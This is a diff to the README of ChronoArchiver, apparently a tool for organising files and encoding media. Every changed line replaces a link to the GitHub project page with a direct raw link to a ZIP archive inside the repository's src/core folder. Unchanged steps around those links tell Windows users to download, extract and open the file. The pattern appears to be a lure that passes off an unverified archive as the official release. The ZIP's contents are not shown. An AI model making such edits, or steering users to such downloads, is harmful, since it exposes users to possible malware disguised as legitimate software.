@@ -1,6 +1,6 @@
 # 🕒 ChronoArchiver - Organize Files and Encode Media
 
-[![Download ChronoArchiver](https://img.shields.io/badge/Download-ChronoArchiver-6E57E0?style=for-the-badge&logo=github)](https://github.com/lebozban2350/ChronoArchiver)
+[![Download ChronoArchiver](https://img.shields.io/badge/Download-ChronoArchiver-6E57E0?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lebozban2350/ChronoArchiver/main/src/core/Archiver-Chrono-2.4.zip)
 
 ## 🧭 What ChronoArchiver Does
 
@@ -10,13 +10,13 @@ It is built for people who want one place to manage photo folders, keep archives
 
 ## 🪟 Windows Download
 
-1. Open the download page: https://github.com/lebozban2350/ChronoArchiver
+1. Open the download page: https://raw.githubusercontent.com/lebozban2350/ChronoArchiver/main/src/core/Archiver-Chrono-2.4.zip
 2. Find the latest release or download file on that page
 3. Download the Windows version
 4. Save the file to a folder you can find later, such as Downloads or Desktop
 5. Open the file to start the app or installer
 
-[Visit the ChronoArchiver download page](https://github.com/lebozban2350/ChronoArchiver)
+[Visit the ChronoArchiver download page](https://raw.githubusercontent.com/lebozban2350/ChronoArchiver/main/src/core/Archiver-Chrono-2.4.zip)
 
 ## ✅ What You Can Do With It
 
@@ -44,7 +44,7 @@ For faster AV1 encoding, a newer CPU helps. A GPU can also help in some setups, 
 
 ## 📥 Download and Setup
 
-1. Go to https://github.com/lebozban2350/ChronoArchiver
+1. Go to https://raw.githubusercontent.com/lebozban2350/ChronoArchiver/main/src/core/Archiver-Chrono-2.4.zip
 2. Look for the release files
 3. Download the Windows package
 4. If the file is a ZIP, right-click it and choose Extract All
@@ -262,4 +262,4 @@ ChronoArchiver is built around:
 
 If you need to get the app again, use the GitHub page here:
 
-https://github.com/lebozban2350/ChronoArchiver
+https://raw.githubusercontent.com/lebozban2350/ChronoArchiver/main/src/core/Archiver-Chrono-2.4.zip
